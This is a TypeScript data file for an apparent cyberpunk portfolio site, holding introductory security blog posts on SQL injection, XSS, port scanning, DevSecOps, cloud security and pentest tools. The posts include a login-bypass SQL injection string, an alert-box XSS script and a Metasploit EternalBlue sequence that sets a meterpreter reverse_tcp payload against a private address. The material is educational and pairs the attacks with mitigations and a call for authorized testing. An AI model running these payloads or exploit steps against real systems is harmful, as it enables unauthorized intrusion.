export interface BlogPost {
  id: number;
  title: string;
  excerpt: string;
  tags: string[];
  date: string;
  readTime: string;
  content: string;
  heroImage?: string;
  codeSnippets?: { language: string; code: string }[];
  relatedPosts?: number[];
  isStandalone?: boolean;
}

export interface BlogFolder {
  id: number;
  name: string;
  icon: string;
  posts: BlogPost[];
  gradient: string;
}

export const blogPosts: BlogPost[] = [
  {
    id: 1,
    title: "Breaking Down SQL Injection Attacks",
    excerpt: "Understanding one of the OWASP Top 10 vulnerabilities...",
    tags: ["Security", "Pentesting", "WebApps"],
    date: "2024-03-15",
    readTime: "8 min read",
    heroImage: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=400&fit=crop",
    content: `
# SQL Injection: An Attacker's Entry Point

SQL Injection (SQLi) is a vulnerability where user input can manipulate queries sent to a database.

## The Vulnerable Code

Example vulnerable query:

\`\`\`sql
SELECT * FROM users WHERE username = 'admin' AND password = '1234';
\`\`\`

If the input is not sanitized, an attacker could enter:

\`\`\`
' OR '1'='1
\`\`\`

Which results in bypassing authentication.

## Mitigation Strategies

➡️ **Always use parameterized queries and ORM safeguards.**

### Secure Implementation:

\`\`\`python
# Good - Using parameterized queries
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
\`\`\`

### Additional Protection Layers:
- Input validation and sanitization
- Principle of least privilege for database users
- Web Application Firewalls (WAF)
- Regular security audits and penetration testing

## Conclusion

SQL Injection remains one of the most critical web vulnerabilities. Understanding attack vectors is the first step to building secure applications.
    `,
    relatedPosts: [2, 3],
  },
  {
    id: 2,
    title: "XSS 101: Cross-Site Scripting Explained",
    excerpt: "Learn how attackers inject malicious scripts into web pages...",
    tags: ["Security", "WebApps"],
    date: "2024-03-12",
    readTime: "6 min read",
    heroImage: "https://images.unsplash.com/photo-1504639725590-34d0984388bd?w=1200&h=400&fit=crop",
    content: `
# Understanding Cross-Site Scripting (XSS)

XSS attacks allow attackers to inject malicious JavaScript into trusted websites.

## Types of XSS

1. **Reflected XSS** - Immediate response from server
2. **Stored XSS** - Persisted in database
3. **DOM-based XSS** - Client-side manipulation

## Example Attack

\`\`\`javascript
<script>alert('XSS Vulnerability!')</script>
\`\`\`

## Prevention

- Content Security Policy (CSP)
- Input sanitization
- Output encoding
- HttpOnly cookies
    `,
    relatedPosts: [1, 4],
  },
  {
    id: 3,
    title: "Python Automation for Security",
    excerpt: "Automate vulnerability scanning with Python scripts...",
    tags: ["Python", "Security", "DevOps"],
    date: "2024-03-10",
    readTime: "10 min read",
    heroImage: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&h=400&fit=crop",
    content: `
# Automating Security Tasks with Python

Python is the go-to language for security automation and tooling.

## Building a Simple Port Scanner

\`\`\`python
import socket

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0
\`\`\`

## Popular Security Libraries

- **Scapy** - Packet manipulation
- **Requests** - HTTP testing
- **Paramiko** - SSH automation
- **Nmap** - Network scanning wrapper
    `,
    relatedPosts: [5, 6],
  },
  {
    id: 4,
    title: "Secure DevOps Pipelines",
    excerpt: "Integrate security testing into CI/CD workflows...",
    tags: ["DevOps", "Security", "Cloud"],
    date: "2024-03-08",
    readTime: "12 min read",
    heroImage: "https://images.unsplash.com/photo-1667372393119-3d4c48d07fc9?w=1200&h=400&fit=crop",
    content: `
# Building Secure CI/CD Pipelines

Security should be integrated at every stage of the DevOps lifecycle.

## DevSecOps Principles

1. Shift Left Security
2. Automated Security Testing
3. Continuous Monitoring
4. Infrastructure as Code Security

## Example GitHub Actions Workflow

\`\`\`yaml
name: Security Scan
on: [push]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Security Scan
        run: |
          npm audit
          snyk test
\`\`\`
    `,
    relatedPosts: [3, 5],
  },
  {
    id: 5,
    title: "Raspberry Pi Security Lab Setup",
    excerpt: "Build a portable penetration testing lab with Raspberry Pi...",
    tags: ["Hardware", "Security"],
    date: "2024-03-05",
    readTime: "15 min read",
    heroImage: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=1200&h=400&fit=crop",
    content: `
# Building a Portable Pentest Lab

Transform a Raspberry Pi into a powerful security testing platform.

## Required Hardware

- Raspberry Pi 4 (8GB RAM recommended)
- 128GB+ MicroSD card
- Portable battery pack
- WiFi adapter with monitor mode

## Software Stack

\`\`\`bash
# Install Kali Linux ARM
wget https://kali.org/get-kali/arm-images/
dd if=kali-linux-arm.img of=/dev/sdX bs=4M
\`\`\`

## Essential Tools to Install

- Metasploit Framework
- Burp Suite
- Wireshark
- Aircrack-ng
    `,
    relatedPosts: [6, 1],
  },
  {
    id: 6,
    title: "Cloud Security Fundamentals",
    excerpt: "Securing cloud infrastructure on AWS, Azure, and GCP...",
    tags: ["Cloud", "Security", "DevOps"],
    date: "2024-03-01",
    readTime: "9 min read",
    heroImage: "https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1200&h=400&fit=crop",
    content: `
# Cloud Security Best Practices

Protecting cloud infrastructure requires a multi-layered approach.

## Key Security Areas

### Identity & Access Management
- Principle of least privilege
- Multi-factor authentication
- Regular access reviews

### Network Security
\`\`\`
- VPC configuration
- Security groups
- Network ACLs
- WAF implementation
\`\`\`

### Data Protection
- Encryption at rest
- Encryption in transit
- Key management (KMS)
- Backup and disaster recovery
    `,
    relatedPosts: [4, 3],
  },
  {
    id: 7,
    title: "Breaking Down Penetration Testing Tools",
    excerpt: "Explore the most commonly used penetration testing tools and how they fit into real-world security workflows...",
    tags: ["Cybersecurity", "PenTesting", "Metasploit"],
    date: "2024-02-25",
    readTime: "14 min read",
    heroImage: "https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=1200&h=400&fit=crop",
    isStandalone: true,
    content: `
# Breaking Down Penetration Testing Tools

In this comprehensive guide, we'll explore some of the most commonly used penetration testing tools and how they fit into a real-world security workflow. Understanding these tools is crucial for any aspiring security professional.

## Introduction

A successful penetration test isn't just about running tools—it's about understanding the methodology, knowing when to use each tool, and interpreting results correctly. Let's dive into the essential toolkit of a modern penetration tester.

## Section 1: Scanning with Nmap

**Nmap** (Network Mapper) is the industry standard for network discovery and security auditing. It's the first tool you'll reach for when assessing a new target.

### Basic Usage

\`\`\`bash
# Quick scan of common ports
nmap -F target.com

# Comprehensive scan with service detection
nmap -sV -sC -p- target.com

# Aggressive scan with OS detection
nmap -A target.com
\`\`\`

### Key Features
- Port scanning and service detection
- Operating system fingerprinting
- Vulnerability detection with NSE scripts
- Network mapping and topology discovery

Nmap provides the foundation for understanding your target's attack surface. Always start here to identify open ports, running services, and potential entry points.

## Section 2: Exploiting with Metasploit

**Metasploit Framework** is the world's most used penetration testing platform. It provides a vast arsenal of exploits, payloads, and auxiliary modules.

### The Metasploit Workflow

\`\`\`bash
# Launch Metasploit console
msfconsole

# Search for exploits
search type:exploit platform:windows

# Configure and run an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
\`\`\`

### Why Metasploit Matters
- Extensive exploit database
- Automated exploitation workflows
- Post-exploitation modules
- Payload generation and delivery
- Integration with other security tools

The framework handles the complexity of exploit development, allowing penetration testers to focus on methodology and impact assessment.

## Section 3: Analyzing with Wireshark

**Wireshark** is the world's foremost network protocol analyzer. It's essential for understanding network traffic and identifying security issues.

### Capture and Analysis

When analyzing network traffic, look for:
- Unencrypted credentials
- Suspicious connection patterns
- Protocol anomalies
- Data exfiltration attempts

### Common Use Cases
1. **Traffic Analysis**: Understanding application behavior
2. **Troubleshooting**: Identifying network issues
3. **Security Monitoring**: Detecting malicious activity
4. **Protocol Development**: Testing new implementations

### Pro Tips
- Use display filters to focus on relevant traffic
- Follow TCP streams to see complete conversations
- Export objects to extract files from network captures
- Apply coloring rules to highlight important packets

## Section 4: Additional Essential Tools

### Burp Suite
The gold standard for web application security testing:
- Intercepting proxy
- Scanner for automated vulnerability detection
- Intruder for customized attacks
- Repeater for manual testing

### OWASP ZAP
Free alternative to Burp Suite with powerful features:
- Automated scanning
- Manual testing tools
- API testing support
- Extensive plugin ecosystem

### Hashcat
Password cracking at scale:
- GPU-accelerated cracking
- Support for 300+ hash types
- Dictionary and brute-force attacks
- Rule-based mutations

## Methodology Over Tools

Remember: **Tools are only as effective as the person using them.**

A successful penetration test follows a structured methodology:

1. **Reconnaissance**: Gather information about the target
2. **Scanning**: Identify live hosts, open ports, and services
3. **Enumeration**: Extract detailed information about targets
4. **Exploitation**: Gain access to systems
5. **Post-Exploitation**: Maintain access and extract data
6. **Reporting**: Document findings and recommendations

## Conclusion

Mastering penetration testing tools is a journey, not a destination. Each tool has its strengths and weaknesses, and knowing when to use each one comes with experience.

The key takeaways:
- **Start with reconnaissance** - Know your target before attacking
- **Use multiple tools** - Validate findings with different approaches  
- **Understand the output** - Don't just run tools blindly
- **Practice legally** - Only test systems you have permission to assess
- **Keep learning** - The security landscape evolves constantly

A successful pentest isn't about tools—it's about **methodology, precision, and ethical responsibility**.

## Additional Resources

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Nmap Network Scanning Book](https://nmap.org/book/)
- [Wireshark User Guide](https://www.wireshark.org/docs/)
    `,
    relatedPosts: [1, 2, 5],
  },
];

export const blogFolders: BlogFolder[] = [
  {
    id: 1,
    name: "Web Security",
    icon: "🛡️",
    gradient: "from-tag-security/20 to-cyber-pink/20",
    posts: blogPosts.filter(p => !p.isStandalone && (p.id === 1 || p.id === 2)),
  },
  {
    id: 2,
    name: "Python & Automation",
    icon: "🐍",
    gradient: "from-tag-python/20 to-cyber-green/20",
    posts: blogPosts.filter(p => !p.isStandalone && p.id === 3),
  },
  {
    id: 3,
    name: "DevOps & Cloud",
    icon: "☁️",
    gradient: "from-tag-devops/20 to-tag-cloud/20",
    posts: blogPosts.filter(p => !p.isStandalone && (p.id === 4 || p.id === 6)),
  },
  {
    id: 4,
    name: "Hardware Projects",
    icon: "🔧",
    gradient: "from-tag-hardware/20 to-cyber-gold/20",
    posts: blogPosts.filter(p => !p.isStandalone && p.id === 5),
  },
];

// Hidden Easter Egg Folder
export const hiddenFolder: BlogFolder = {
  id: 999,
  name: "Behind the Scenes",
  icon: "🔓",
  gradient: "from-cyber-gold/20 to-cyber-pink/20",
  posts: [
    {
      id: 99,
      title: "The Making of This Portfolio",
      excerpt: "Behind the scenes of building a cyberpunk portfolio with React and TypeScript...",
      tags: ["Development", "React", "Design"],
      date: "2024-04-01",
      readTime: "5 min read",
      heroImage: "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=1200&h=400&fit=crop",
      content: `
# Behind the Scenes: Building This Portfolio

You found the secret! This hidden archive contains experimental projects and behind-the-scenes insights.

## The Tech Stack

This portfolio was built using:
- **React** with TypeScript for type safety
- **Tailwind CSS** for the cyberpunk aesthetic
- **Framer Motion** for smooth animations
- **Vite** for blazing fast builds

## Design Philosophy

The goal was to create something that feels like you're hacking into a secure terminal, while maintaining excellent UX and accessibility.

## Easter Eggs

This isn't the only hidden feature. Keep exploring...
      `,
    },
  ],
};
